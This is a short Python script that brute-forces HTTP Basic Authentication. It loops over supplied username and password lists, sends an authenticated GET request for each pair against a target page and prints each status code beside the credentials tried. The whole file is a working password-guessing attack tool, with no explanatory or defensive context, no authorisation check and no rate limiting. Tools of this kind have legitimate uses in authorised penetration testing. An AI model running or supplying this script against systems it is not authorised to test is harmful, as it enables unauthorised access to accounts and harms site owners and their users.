import requests
import argparse
import sys

parser = argparse.ArgumentParser(description='Brute Force for Basic Auth targets')
parser.add_argument('--page', dest='page', help='Target Page', required=True)
parser.add_argument('--user_file', dest='user_file', help='Username File', type=argparse.FileType('r'))
parser.add_argument('--pass_file', dest='pass_file', help='Password File', type=argparse.FileType('r'))
parser.add_argument('--user_list', dest='user_list', nargs='+', help='List Usernames (e.g. admin user test)')
parser.add_argument('--pass_list', dest='pass_list', nargs='+', help='List Passwords (e.g. pass 123 test)')

args = parser.parse_args()

if args.user_file is None and args.user_list is None:
    sys.exit('Username list or File not specified. -h or --help for more details')

if args.pass_file is None and args.pass_list is None:
    sys.exit('Password list or File not specified. -h or --help for more details')

if args.user_file is not None:
    args.user_file = args.user_file.readlines()
else:
    args.user_file = None

if args.pass_file is not None:
    args.pass_file = args.pass_file.readlines()
else:
    args.pass_file = None

for username_arg in (args.user_list, args.user_file):
    if username_arg is not None:
        for user in username_arg:
            for password_arg in (args.pass_list, args.pass_file):
                if password_arg is not None:
                    for password in password_arg:
                        r = requests.get(args.page, auth=(user.replace("\n", ""), password.replace("\n", "")))
                        print(r.status_code, 'USER:', user.replace("\n", ""), 'PASS:', password.replace("\n", ""))